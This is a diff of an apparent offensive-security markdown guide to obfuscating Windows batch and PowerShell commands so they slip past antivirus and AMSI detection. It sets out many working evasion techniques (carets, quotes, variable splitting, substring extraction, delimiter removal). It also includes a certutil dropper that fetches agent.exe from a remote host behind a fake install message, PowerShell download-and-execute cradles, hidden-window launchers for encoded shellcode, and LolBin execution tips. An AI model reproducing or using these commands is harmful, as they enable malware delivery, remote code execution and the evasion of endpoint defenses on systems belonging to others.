@@ -14,15 +14,13 @@ suites like microsoft's AMSI/DEP/ASLR string based detection mechanisms ..
 **Example of one obfuscated bat agent** [ Agent.bat ]<br />
 ![Batch obfuscation](https://user-images.githubusercontent.com/23490060/94740418-881dc080-036a-11eb-9b99-b72b3a4959de.png)<br />
 
-**Example of one obfuscated vbs agent** [ Agent.vbs ]<br />
-![vbscript obfuscation](http://i.cubeupload.com/7oPCYh.png)<br />
 
 ---
 
 <br />
 
 ## Glosario (Index):
-[1] [Batch Obfuscation Technics (cmd-bat)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#batch-obfuscation-cmd-bat)<br />
+[1] [Batch Obfuscation Technics (cmd-bat)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#octocat-batch-obfuscation-cmd-bat)<br />
 [2] [Bash Obfuscation Technics (bash-sh)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#bash-obfuscation-bash-sh)<br />
 [3] [Powershell Obfuscation Technics (psh-ps1)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#powershell-obfuscation-psh-ps1)<br />
 [4] [VBScript Obfuscation Technics (vba-vbs)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#vbscript-obfuscation-technics-vba-vbs)<br />
@@ -39,50 +37,61 @@ suites like microsoft's AMSI/DEP/ASLR string based detection mechanisms ..
 
 <br /><br /><br />
 
-## Batch Obfuscation (cmd-bat)
+## :octocat: Batch Obfuscation (cmd-bat)
+
+<br />
 
 String to obfuscate<br />
-
-      cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
-
+```cmd
+cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
+```
 
 String obfuscated<br />
-
-      cm^d.e^xe /c po^w^er^shel^l.ex^e -n^op -w^i^nd h^idd^en -Ex^e^c B^yp^a^ss -no^n^i -en^c $shellcode
+```cmd
+cm^d.e^xe /c po^w^er^shel^l.ex^e -n^op -w^i^nd h^idd^en -Ex^e^c B^yp^a^ss -no^n^i -en^c $shellcode
+```
 
 ---
 
-String to obfuscate<br />
+<br />
 
-      cmd.exe /c powershell.exe Get-WmiObject -Class win32_ComputerSystem
+String to obfuscate<br />
+```cmd
+cmd.exe /c powershell.exe Get-WmiObject -Class win32_ComputerSystem
+```
 
 String obfuscated<br />
-
-      c"m"d.ex"e" /c pow"e"r"s"hell"."e"x"e G"e"t"-"Wmi"O"bje"c"t -Cl"a"ss win32_ComputerSystem
+```cmd
+c"m"d.ex"e" /c pow"e"r"s"hell"."e"x"e G"e"t"-"Wmi"O"bje"c"t -Cl"a"ss win32_ComputerSystem
+```
 
 ![rr](https://user-images.githubusercontent.com/23490060/94753079-0b4c1000-0385-11eb-80b5-9712ae6d8a17.png)
 `HINT: In tests conducted i was not been able to use 2 letters inside double quotes (eg. c"md".exe)`
 
 ---
 
+<br />
+
 Any formula under the **batch interpreter** can be started with the follow special characters: **`@`** or **`=`** or **`,`** or **`;`**
 
-      =cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
+```cmd
+=cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
 
-      @cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
+@cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
 
-      ,cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
+,cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
 
-      ;cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
+;cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
 
+cmd.exe /c @powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
 
-      cmd.exe /c @powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
-
-      cmd.exe /c =powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
+cmd.exe /c =powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
+```
 
 String obfuscated<br />
-
-      @c^m"d".ex^e /c ,p"o"wer^s^hell"."ex^e G"e"t"-"Wm^i"O"bje"c"t -Cl"a"s^s win32_ComputerSystem
+```cmd
+@c^m"d".ex^e /c ,p"o"wer^s^hell"."ex^e G"e"t"-"Wm^i"O"bje"c"t -Cl"a"s^s win32_ComputerSystem
+```
 
 ![last](https://user-images.githubusercontent.com/23490060/94753411-0dfb3500-0386-11eb-9014-2103d88b677e.png)
 ---
@@ -95,347 +104,369 @@ HINT: Empty space technic can't be used to brake the command argument, but used 
 <br />
 
 String to obfuscate<br />
-
-      cmd.exe /c start /max netstat -ano | findstr LISTENING
-
-String obfuscated [whitespaces]<br />
-
-![batch obfuscation](http://i.cubeupload.com/eyGNUO.jpg)
+```cmd
+cmd.exe /c start /max netstat -ano | findstr LISTENING
+```
 
 String obfuscated [whitespaces+collon+semi-collon]<br />
-
-      cmd.exe /c ,;,  start ;,,  /max ;,,  netstat -ano |; findstr  ,;LISTENING
+```cmd
+cmd.exe /c ,;,  start ;,,  /max ;,,  netstat -ano |; findstr  ,;LISTENING
+```
 
 String obfuscated [whitespaces+collon+semi-collon+caret]<br />
-
-      c^md.e^xe /^c ,;,  st^ar^t ,/mA^x ;^,,  n^et^sta^t -a^no |; fi^nds^tr  ,;LI^ST^ENING
+```cmd
+c^md.e^xe /^c ,;,  st^ar^t ,/mA^x ;^,,  n^et^sta^t -a^no |; fi^nds^tr  ,;LI^ST^ENING
+```
 
 String obfuscated [whitespaces+collon+semi-collon+caret+quotes]<br />
-
-      ;c^M"d".e^Xe ,/^c ,;,  ,sT^aR^t ,/mA^x "";^,,  n^Et^s"T"a^t  -a^"n"O |;, ,fI^n"d"S^tr  ,;L"I"^ST^EN"I"NG
-
-![batch obfuscation](http://i.cubeupload.com/zneLJv.jpg)
+```cmd
+;c^M"d".e^Xe ,/^c ,;,  ,sT^aR^t ,/mA^x "";^,,  n^Et^s"T"a^t  -a^"n"O |;, ,fI^n"d"S^tr  ,;L"I"^ST^EN"I"NG
+```
 
 ---
 
-Using the alternative cmd.exe [ /R ] switch to execute commands
+<br />
 
-![batch obfuscation](http://i.cubeupload.com/dQkpXr.jpg)<br />
+Using the alternative cmd.exe [ /R ] switch to execute commands<br /><br />
+
+String to obfuscate<br />
+```cmd
+cmd.exe /c start calc.exe
+```
+
+String obfuscated<br />
+```cmd
+cmd.exe /R start calc.exe
+```
+
+![rr2](https://user-images.githubusercontent.com/23490060/120902266-3c2cc500-c637-11eb-91e3-71e3a6ece512.png)
+
+---
+
+<br />
+
+since we are using the cmd interpreter to lunch powershell,<br />
+we can replace the powershell trigger args '`-`' by cmd interpreter: '`/`'
 
 <br />
 
 String to obfuscate<br />
-
-      cmd.exe /c start calc.exe
+```cmd
+cmd.exe /c powershell.exe -wind hidden Get-WmiObject -Class Win32_ComputerSystem
+```
 
 String obfuscated<br />
-
-      cmd.exe /R start calc.exe
-
-![batch obfuscation](http://i.cubeupload.com/9cwoS1.jpg)
+```cmd
+cmd.exe /c powershell.exe /wInd 3 Get-WmiObject -Class Win32_ComputerSystem
+```
 
 ---
-
-- cmd arguments trigger chars [ - or / ]
-
-      since we are using the cmd interpreter to lunch powershell, we can replace
-      the powershell trigger arguments characters '-' by cmd interpreter: '/'
 
 <br />
 
-- String to obfuscate<br />
-`cmd.exe /c powershell.exe -wind hidden Get-WmiObject -Class Win32_ComputerSystem`
-
-- String obfuscated<br />
-`cmd.exe /c powershell.exe /wInd 3 Get-WmiObject -Class Win32_ComputerSystem`<br />
-
-![batch obfuscation](http://i.cubeupload.com/MngcC1.jpg)
-
----
-
-- We can also **pipe** commands to avoid detection, adding rubish data into the beggining of the funtion
-
-      echo "rubish data" | cmd.exe /c start powershell.exe
+We can also **pipe** commands to avoid detection, adding rubish data into the beggining of the funtion
+```cmd
+echo "rubish data" | cmd.exe /c start powershell.exe
+```
 
 ![one](https://user-images.githubusercontent.com/23490060/95484664-a7c77100-0988-11eb-8450-85b815cf1c06.png)
 
-      HINT: using [ || ] allow us to execute the 2º command if the 1º one fails to execute
-      COPY %windir%\notepad.exe %nonexisting%\fake.exe || cmd.exe /c start calc
-
-![pipe commands](http://i.cubeupload.com/EIQWfa.jpg)
-
+HINT: using [ || ] allow us to execute the 2º command if the 1º one fails to execute<br />
 
 ---
 
-      [ Brake command line arguments into diferent vars ]
-      The batch command 'CALL' executes one batch file from within another. If you execute a
-      batch file from inside another batch file without using CALL, the original batch file
-      is terminated before the other one starts. CALL command can also be used to 'call'
-      the previous defined variables and joint them together in a new environment variable. 
+<br />
+
+<b><i>[ Brake command line arguments into diferent vars ]</i></b>
+The batch command 'CALL' executes one batch file from within another. If you execute a
+batch file from inside another batch file without using CALL, the original batch file
+is terminated before the other one starts. CALL command can also be used to 'call'
+the previous defined variables and joint them together in a new environment variable. 
       
-
 <br />
 
 
-- String command to obfuscate<br />
-`cmd.exe /c netstat -s -p TCP`
+String command to obfuscate<br />
+```cmd
+cmd.exe /c netstat -s -p TCP
+```
 
-- String obfuscated [brake command line arguments into diferent vars]<br />
+String obfuscated [brake command line arguments into diferent vars]<br />
+```cmd
+cmd.exe /c "set com3= /s /p TCP&&set com2=stat&&set com1=net&&call set join=%com1%%com2%%com3%&&call %join%"
+```
 
-      cmd.exe /c "set com3= /s /p TCP&&set com2=stat&&set com1=net&&call set join=%com1%%com2%%com3%&&call %join%"
+<br />
 
-![batch obfuscation](http://i.cubeupload.com/LtFMqK.jpg)
+String obfuscated [brake command line arguments into diferent vars]<br />
+```cmd
+cmd.exe /c "set com1=net&&set com2=stat&&set join=%com1%%com2%&&echo %join% | cmd"
+```
 
-      Another diferent way to brake the command into diferent variables, join them together, and exec
+<br />
 
-- String obfuscated [brake command line arguments into diferent vars]<br />
-`cmd.exe /c "set com1=net&&set com2=stat&&set join=%com1%%com2%&&echo %join% | cmd"`
+String obfuscated [brake command line arguments into diferent vars]<br />
+```cmd
+cmd.exe /c "set com1=net&&set com2=stat&&set com3=-p&&set join=%com1%%com2% -s %com3% TCP&&echo %join%|cmd"
+```
 
-![batch obfuscation](http://i.cubeupload.com/vzzmTR.jpg)
+<br />
 
-      HINT: we can separate the command arguments also, example: cmd.exe /c [var][var] -s [var] TCP
-      This way we can separate the command from its arguments or even input a new argument in the middle.
+String obfuscated [another example using cmd /c to exec the string]<br />
+```cmd
+cmd.exe /c "set buff=net&& set void=at&&set char=st&&" cmd /V:ON /c %buff%!char!%void% -s -p UDP
+```
 
-- String obfuscated [brake command line arguments into diferent vars]<br />
+<br />
 
-      cmd.exe /c "set com1=net&&set com2=stat&&set com3=-p&&set join=%com1%%com2% -s %com3% TCP&&echo %join%|cmd"
+String obfuscated [special characters inside set declarations]<br />
+```cmd
+cmd.exe /c "set --$#$--=net&& set '''=at&&set ;;;;=st&&" cmd /c %--$#$--%%;;;;%%'''% -s -p UDP
+```
 
-![batch obfuscation](http://i.cubeupload.com/A4j8mi.jpg)
-
-      we can also use the "enabling delayed environment variable expansion" [/V:ON]
-      command to be able to call your variales in two diferent ways: %var% OR !var!
-
-- String obfuscated [another example using cmd /c to exec the string]<br />
-`cmd.exe /c "set buff=net&& set void=at&&set char=st&&" cmd /V:ON /c %buff%!char!%void% -s -p UDP`
-
-![batch obfuscation](http://i.cubeupload.com/Y2KNXr.jpg)
-
-      cmd.exe variable declarations also accepts special characters
-
-- String obfuscated [special characters inside set declarations]<br />
-`cmd.exe /c "set --$#$--=net&& set '''=at&&set ;;;;=st&&" cmd /c %--$#$--%%;;;;%%'''% -s -p UDP`
-
-![batch obfuscation](http://i.cubeupload.com/v5FqKw.jpg)
+![rr1](https://user-images.githubusercontent.com/23490060/120902358-dd1b8000-c637-11eb-87d5-90e675818895.png)
 
 ---
 
-      Obfuscating windows batch files using undefined environmental variables.
-      '''Inside .bat files''' undefined environmental variables are expanded into empty strings
-      Since cmd.exe allows using variables inside commands, this can be used for obfuscation.
+<br />
 
-      Choose some set of environmental variables that you are certain are not defined
-      on most of the machines Example: single or two letter variables like %A%, %0B%, %C% ..
+<b><i>Obfuscating windows batch files using undefined environmental variables.</i></b> '''Inside .bat files''' undefined environmental variables<br />
+are expanded into empty strings Since cmd.exe allows using variables inside commands, this can be used for obfuscation.
+
+Chose some set of environmental variables that are not defined on most of the machines Example: `%A%`, `%0B%`, `%C%` ..
 
 <br />
 
-- String command to obfuscate<br />
-`cmd.exe /c powershell.exe -nop -Exec Bypass -noni -enc $shellcode`<br />
+String command to obfuscate<br />
+```cmd
+cmd.exe /c powershell.exe -nop -Exec Bypass -noni -enc $shellcode
+```
 
-- String obfuscated (**undefined-vars.bat**)<br />
-
-      @echo off
-      %comspec% /c p%A%owe%B%rshell.e%C%xe -n%C%op -E%A%xec B%C%yp%B%ass -n%A%oni -e%A%nc $shellcode
-      exit
+String obfuscated (**undefined-vars.bat**)<br />
+```cmd
+@echo off
+%comspec% /c p%A%owe%B%rshell.e%C%xe -n%C%op -E%A%xec B%C%yp%B%ass -n%A%oni -e%A%nc $shellcode
+exit
+```
 
 ![two](https://user-images.githubusercontent.com/23490060/95485321-769b7080-0989-11eb-9861-ddeaa86481de.png)<br />
 `HINT: Undefined variables technic are only accessible in bat scripting (it will not work in terminal)`
 
 ---
 
-      We can also use batch local enviroment variables to scramble the syscall's
-      Since cmd.exe allows using variables inside commands, this can be used for obfuscation.
-      HINT: chose letters as: 'a e i o u' because they are the most commom ;)
-      HINT: dont leave 'empty spaces' defining variables (set i#=t<empty-space>)
+<br />
+
+<b><i>We can also use batch local enviroment variables to scramble the syscall's</i></b>
+Since cmd allows using variables inside commands, this can be used for obfuscation. HINT: chose letters as: 'a e i o u' because they are the most commom. HINT: dont leave 'empty spaces' defining variables.
 
 <br />
 
-- String command to obfuscate<br />
-`netstat -s | findstr Opens`<br />
+String command to obfuscate<br />
+```cmd
+netstat -s | findstr Opens
+```
 
-- String obfuscated (**test.bat**)<br />
+String obfuscated (**test.bat**)<br />
+```cmd
+@echo off
+set i#=t
+set pP0=p
+set db0=a
+set !h=n
 
-      @echo off
-      set i#=t
-      set pP0=p
-      set db0=a
-      set !h=n
-
-      %!h%e%i#%st%db0%%i#% -"s" | fi%!h%ds%i#%r O%pP0%e%!h%s
+%!h%e%i#%st%db0%%i#% -"s" | fi%!h%ds%i#%r O%pP0%e%!h%s
+```
 
 ![tres](https://user-images.githubusercontent.com/23490060/95486006-63d56b80-098a-11eb-94b1-a7ea0d6ca7f1.png)
 
 ---
-
-      This next technic uses one batch local variable (%varObj%) as MasterKey that allow us to extract
-      the strings inside the %varoBj% variable to build our command. [special thanks: @Wandoelmo Silva]
-
+	
 <br />
 
-- String command to obfuscate<br />
-`cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`<br />
+This next technic uses one batch local variable (%varObj%) as MasterKey that allow us to extract<br />
+the character's inside the `%varoBj%` variable to build our command. [special thanks: @Wandoelmo Silva]
 
-- String obfuscated (**template.bat**)<br />
-
-      @echo off
-      SET varObj=abcdefghijlmnopqrstuvxzkyW0123456789ABCDEFGHIJLMNOPQRSTUVXZKYW
-      %varObj:~2,1%%varObj:~11,1%%varObj:~3,1%.exe /c %varObj:~14,1%%varObj:~13,1%%varObj:~25,1%%varObj:~4,1%%varObj:~16,1%%varObj:~17,1%%varObj:~7,1%%varObj:~6,1%%varObj:~10,1%%varObj:~10,1%.exe -nop -%varObj:~25,1%%varObj:~8,1%%varObj:~3,1%%varObj:~3,1%%varObj:~4,1%%varObj:~12,1% -%varObj:~40,1%%varObj:~21,1%%varObj:~4,1%%varObj:~2,1% %varObj:~37,1%%varObj:~24,1%%varObj:~14,1%%varObj:~0,1%%varObj:~17,1%%varObj:~17,1% -noni -%varObj:~4,1%%varObj:~12,1%%varObj:~2,1% $shellcode
-      exit
-
-![batch obfuscation](http://i67.tinypic.com/2zdu9z7.jpg)
-
+<br />
+	
+String command to obfuscate<br />
+```cmd
+cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
+```
+	
+String obfuscated (**template.bat**)<br />
+```cmd
+@echo off
+SET varObj=abcdefghijlmnopqrstuvxzkyW0123456789ABCDEFGHIJLMNOPQRSTUVXZKYW
+%varObj:~2,1%%varObj:~11,1%%varObj:~3,1%.exe /c %varObj:~14,1%%varObj:~13,1%%varObj:~25,1%%varObj:~4,1%%varObj:~16,1%%varObj:~17,1%%varObj:~7,1%%varObj:~6,1%%varObj:~10,1%%varObj:~10,1%.exe -nop -%varObj:~25,1%%varObj:~8,1%%varObj:~3,1%%varObj:~3,1%%varObj:~4,1%%varObj:~12,1% -%varObj:~40,1%%varObj:~21,1%%varObj:~4,1%%varObj:~2,1% %varObj:~37,1%%varObj:~24,1%%varObj:~14,1%%varObj:~0,1%%varObj:~17,1%%varObj:~17,1% -noni -%varObj:~4,1%%varObj:~12,1%%varObj:~2,1% $shellcode
+exit
+```
+	
+![rr3](https://user-images.githubusercontent.com/23490060/120903255-068ada80-c63d-11eb-8c65-fa91148135b0.png)<br />
+	
 [!] [Description of %varObj% MasterKey (importante reading to understand the mechanism)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/pedro-Wandoelmo-key.md)<br />
 
 ---
+	
+<br />	
 
-      [ certutil - Additional Methods for Remote Download ]
-      Sometimes we need to use non-conventional methods to deliver our agent to target
-      system and bypass detection, in this situation certutil can be an useful asset.
+<b><i>certutil - Additional Methods for Remote Download</i></b><br />
+Sometimes we need to use non-conventional methods to [deliver our agent](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#downloadexecution-lolbin) to target system and bypass detection.<br />
+In this situation certutil can be an useful asset because AMSI does not scan the download data in oposite to [iwr](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#downloadexecution-lolbin).
 
 <br />
+	
+String command to obfuscate<br />
+```cmd
+cmd.exe /c certutil.exe -urlcache -split -f http://192.168.1.71/agent.exe agent.exe && start agent.exe
+```
+	
+File **certutil-dropper.bat** to be executed in target system<br />
+```cmd
+@echo off
+sEt !h=e
+sEt db=c
+sEt 0x=a
+echo [+] Please Wait, Installing software ..
+;%db%M%A0%d"."eX%!h% /%db% @%db%e"r"Tu%A1%tIl.%!h%^xe "-"u^R%A0%l%db%Ac^h%!h% "-"sP%A0%l^i%A8%T -f ht%A0%tp://19%d0%2.1%A0%68.1.71/agent.exe agent.exe && start agent.exe
+exit
+```
 
-- String command to obfuscate<br />
-`cmd.exe /c certutil.exe -urlcache -split -f http://192.168.1.71/agent.exe agent.exe && start agent.exe`<br />
-
-- File **certutil-dropper.bat** to be executed in target system
-
-      @echo off
-      sEt !h=e
-      sEt db=c
-      sEt 0x=a
-      echo [+] Please Wait, Installing software ..
-      ;%db%M%A0%d"."eX%!h% /%db% @%db%e"r"Tu%A1%tIl.%!h%^xe "-"u^R%A0%l%db%Ac^h%!h% "-"sP%A0%l^i%A8%T -f ht%A0%tp://19%d0%2.1%A0%68.1.71/agent.exe agent.exe && start agent.exe
-      exit
-
-![batch obfuscation certutil.bat](http://i68.tinypic.com/jsfuq1.jpg)
 `HINT: If you desire to send an .bat payload then delete 'start' from the sourcecode`<br />
 
 ---
+	
+<br />
 
-      Using base64 stings decoded at runtime are a Useful obfuscation trick, because
-      the agent.bat dosen't contain any real malicious syscall's to be scan/flagged.
+<b><i>Using base64 stings decoded at runtime are a Useful obfuscation trick.</i></b><br />
+Because the agent.bat dosen't contain any real malicious syscall's to be scan/flagged.
 
-      HINT: Since windows dosen't have a base64 term interpreter built in installed,
-      we have two choises to decode the base64 encoded syscall, or use the built in
-      powershell (::FromBase64String) switch to decode our syscall or we chose to use
-      certutil, but certuil onlly accepts strings taken from inside a text file, in
-      that situation we instruct our script to writte the text files containing the
-      obfuscated syscall's before further head using certutil to decode them.
-
-      REMARK: If the local var can't be accessed from cmd, setX syscall=R2V0LURhdGUK
+HINT: Since windows dosen't have a base64 term interpreter built in installed, we have two choises to decode the base64 encoded syscall, or use the built in powershell (::FromBase64String) switch to decode our syscall or we chose to use certutil, but certuil onlly accepts strings taken from inside a text file, in that situation we instruct our script to writte the text files containing the obfuscated syscall's before further head using certutil to decode them.
 
 <br />
 
-- String command to obfuscate<br />
-`Get-Date`
+String command to obfuscate<br />
+```cmd
+Get-Date
+```
 
-- using base64 to decode the encoded syscall
+using base64 to decode the encoded syscall<br />
+```cmd
+1º - encode the command you want to obfuscate (linux-terminal)
+echo "Get-Date" | base64
 
-      1º - encode the command you want to obfuscate (linux-terminal)
-      echo "Get-Date" | base64
+2º - copy the encoded string to paste it on your script
+R2V0LURhdGUK
 
-      2º - copy the encoded string to paste it on your script
-      R2V0LURhdGUK
+3º - Insert the follow lines into your batch script
+@echo off
+set syscall=R2V0LURhdGUK :: <-- WARNING: Dont leave any 'empty spaces' in variable creation
+powershell.exe $decoded=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($env:syscall)); powershell.exe $decoded ::<-- execute/decode the base64 syscall at runtime
+```
 
-      3º - Insert the follow lines into your batch script
+---
+	
+<br />
 
-        @echo off
-        set syscall=R2V0LURhdGUK :: <-- WARNING: Dont leave any 'empty spaces' in variable creation
-        powershell.exe $decoded=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($env:syscall)); powershell.exe $decoded ::<-- execute/decode the base64 syscall at runtime
+<b><i>cmd similar interpreter's (LolBins)</i></b><br />
 
-![batch obfuscation](http://i66.tinypic.com/qzfbex.jpg)
+defenders watching launches of cmd instance? then use the follow Microsoft signed binarys ([LolBins](https://lolbas-project.github.io/#)) to execute your agents.	
+```cmd
+bash.exe -C calc.exe
+scriptrunner.exe -appvscript calc.exe
+forfiles /p c:\windows\system32\ /m notepad.exe /c calc.exe
+```
+
+![rr4](https://user-images.githubusercontent.com/23490060/120903329-80bb5f00-c63d-11eb-8824-603f0c388417.png)
 
 ---
 
-- More obscure obfuscated/bypass technics<br />
+<br />
 
-      [ cmd similar interpreter's ] defenders watching launches of cmd instance?
-      then use the follow Microsoft signed binarys to execute your agents
+<b><i>delimiter removal in cmd interpreter</i></b><br />
+we can use [ `@` ] special char to obfuscate the syscall and then remove it at execution time..<br />
 
-      bash.exe -C calc.exe
-      scriptrunner.exe -appvscript calc.exe
-      forfiles /p c:\windows\system32\ /m notepad.exe /c calc.exe
-
-![batch obfuscation](http://i.cubeupload.com/i60JVh.jpg)
+The attacker sets the netstat command in a process-level environment variable called x before passing it to the final cmd.exe as standard input. The attacker also obfuscates the string netstat in the original cmd.exe command using `@` characters. The `@` characters are later removed from the command contents stored in the environment variable x using cmd.exe’s native variable string replacement functionality. `%VariableName:StringToFind=NewString%` where `StringToFind` is the `@` character and `NewString` is blank, so the `@` character is simply removed.
 
 <br />
 
-      [ delimiter removal in cmd interpreter :@= ] 
-      we can use [ @ ] special char to obfuscate the syscall and then remove it at execution time..
-
-      The attacker sets the netstat command in a process-level environment variable called x before
-      passing it to the final cmd.exe as standard input. The attacker also obfuscates the string netstat
-      in the original cmd.exe command using @ characters. The @ characters are later removed from the
-      command contents stored in the environment variable x using cmd.exe’s native variable string
-      replacement functionality. %VariableName:StringToFind=NewString% where StringToFind is the @
-      character and NewString is blank, so the @ character is simply removed.
-
+String command to obfuscate<br />
+```cmd
+cmd.exe /c netstat
+```
+	
+String obfuscated<br />
+```cmd
+cmd.exe /c "set x=net@st@at&&echo %x:@=% | cmd"
+```
+	
+![rr5](https://user-images.githubusercontent.com/23490060/120903564-bc0a5d80-c63e-11eb-9e6b-f38562994e18.png)
+	
 <br />
 
-- String command to obfuscate<br />
-`cmd.exe /c netstat`
+This technic can also be used to replace the [ `@` ] special character in local environment<br />
+variable by the char missing on it ( in this example the char missing in command is: [ `t` ] )
+	
+<br />
 
-- String obfuscated<br />
-`cmd.exe /c "set x=net@st@at&&echo %x:@=% | cmd"`
+String obfuscated<br />
+```cmd
+cmd.exe /c "set x=ne@s@a@&&echo %x:@=t% | cmd"
+```
+	
+Remove the first and the last character of a string<br />
+```cmd
+cmd.exe /c "set x=inetstatu&&set str=%x:~1,-1%&&echo %str% | cmd"
+```
 
-![pipe commands](http://i.cubeupload.com/FE0TA8.jpg)
+Returning a specified number of characters from the left side of a string<br />
+```cmd
+cmd.exe /c "set x=netstatrubish&&set str=%x:~0,7%&&echo %str% | cmd"
+```
 
-      This technic can also be used to replace the [ @ ] special character in local environment
-      variable by the char missing on it ( in this example the char missing in command is: [ t ] )
+<br />
+	
+Using the delimiter remove technic into one cradle downloader (powershell or batch)<br />
+	
+<br />	
 
-- String obfuscated<br />
-`cmd.exe /c "set x=ne@s@a@&&echo %x:@=t% | cmd"`
-
-![pipe commands](http://i.cubeupload.com/8ySlqV.jpg)
-
-      Remove the first and the last character of a string
-
-- String obfuscated<br />
-``cmd.exe /c "set x=inetstatu&&set str=%x:~1,-1%&&echo %str% | cmd"``
-
-![pipe commands](http://i.cubeupload.com/y1kA6G.jpg)
-
-      Returning a specified number of characters from the left side of a string
-
-- String obfuscated<br />
-`cmd.exe /c "set x=netstatrubish&&set str=%x:~0,7%&&echo %str% | cmd"`
-
-![pipe commands](http://i.cubeupload.com/McTrjq.jpg)
-
-      Using the delimiter remove technic into one cradle downloader (powershell or batch)
-
-- String command to obfuscate<br />
-`cmd.exe /c powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.71/hello.ps1')`
-
-- String obfuscated<br />
-
-      cmd.exe /c "set x=po@wer@sh@ell.ex@e I@E@X (N@ew-O@bje@ct @Ne@t.@WebC@lie@nt).Do@wnl@oad@St@ri@ng('ht'+'@tp:'+'//@1'+'92@.1'+'6@8.'+'1.71/he@ll@o.ps@1')&&echo %x:@=% | cmd"
-
-![pipe commands](http://i.cubeupload.com/tv0oWc.jpg)
-
-- More obfuscated using carets special batch characters<br />
-
-![pipe commands](http://i.cubeupload.com/EhLChy.jpg)
+String command to obfuscate<br />
+```cmd	
+cmd.exe /c powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.71/hello.ps1')
+```
+	
+String obfuscated<br />
+```cmd
+cmd.exe /c "set x=po@wer@sh@ell.ex@e I@E@X (N@ew-O@bje@ct @Ne@t.@WebC@lie@nt).Do@wnl@oad@St@ri@ng('ht'+'@tp:'+'//@1'+'92@.1'+'6@8.'+'1.71/he@ll@o.ps@1')&&echo %x:@=% | cmd"
+```
 
 ---
 
-      [ Parentheses obfuscation ] Evenly-paired parentheses can encapsulate individual commands
-      in cmd.exe’s arguments without affecting the execution of each command. These unnecessary
-      parenthesis characters indicate the implied sub-command grouping interpreted by cmd.exe’s
-      argument processor. Paired parentheses can be liberally applied for obfuscation purposes.
+<br />
+
+<b><i>Parentheses obfuscation</i></b><br />
+Evenly-paired parentheses can encapsulate individual commands in cmd.exe’s arguments without affecting the execution of each command. These unnecessary parenthesis characters indicate the implied sub-command grouping interpreted by cmd.exe’s argument processor. Paired parentheses can be liberally applied for obfuscation purposes.
 
 <br />
 
-- String command to obfuscate<br />
-`cmd.exe /c whoami && netstat`
+String command to obfuscate<br />
+```cmd
+cmd.exe /c whoami && netstat
+```
 
-- String obfuscated [double Parentheses]<br />
-`cmd.exe /c ((whoami)) && ((netstat))`<br />
+String obfuscated [double Parentheses]<br />
+```cmd
+cmd.exe /c ((whoami)) && ((netstat))
+```
 
-![batch obfuscation](http://i.cubeupload.com/72IYdJ.jpg)
+string more obfuscated using: <b><i>Parentheses + carets + double_quotes + collon + semi-collon + special_chars</i></b><br />
+```cmd
+@c"m"D^.e"X"^e, ^/c (,(=w^H"o"A^m"I");,) ,&&; ( ;(,n^E"T"s^t"A"t);,)
+```
+![rr6](https://user-images.githubusercontent.com/23490060/120912149-c2bbc380-c684-11eb-9071-4a80c836d9a8.png)
 
-- string more obfuscated using: Parentheses+carets+double_quotes+collon+semi-collon<br />
+---
 
-![batch obfuscation](http://i.cubeupload.com/oooagr.jpg)
+<br />
 
       The batch command 'call' executes one batch file from within another. If you execute a
       batch file from inside another batch file without using CALL, the original batch file
@@ -2082,79 +2113,102 @@ This section contains onelinner crandle downloaders that for one reason or anoth
 <br /><br />
 **Powershell Downloaders**<br />
 
-      ## File-less download and execute
-      iex(iwr("http://192.168.1.71/hello.ps1"))
+```powershell
+## File-less download and execute
+iex(iwr("http://192.168.1.71/hello.ps1"))
 
-      iwr -Uri http://192.168.1.71/hello.ps1 -OutFile $env:tmp\hello.ps1
+iwr -Uri http://192.168.1.71/hello.ps1 -OutFile $env:tmp\hello.ps1
 
-      Invoke-WebRequest "http://192.168.1.71/hello.ps1" -OutFile "$env:tmp\hello.ps1" -PassThru;Start-Sleep 1;powershell -File $env:tmp\hello.ps1
+Invoke-WebRequest "http://192.168.1.71/hello.ps1" -OutFile "$env:tmp\hello.ps1" -PassThru;Start-Sleep 1;powershell -File $env:tmp\hello.ps1
 
-      powershell Invoke-WebRequest -H @{"Authorization"="token 123456789012345678901234567890"} https://path/to/file.txt -OutFile $env:tmp\file.txt
+powershell Invoke-WebRequest -H @{"Authorization"="token 123456789012345678901234567890"} https://path/to/file.txt -OutFile $env:tmp\file.txt
 
-      powershell -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://192.168.1.73/hello.ps1', '%tmp%\hello.ps1');powershell Start-Process -windowstyle hidden -FilePath '%tmp%\hello.ps1'
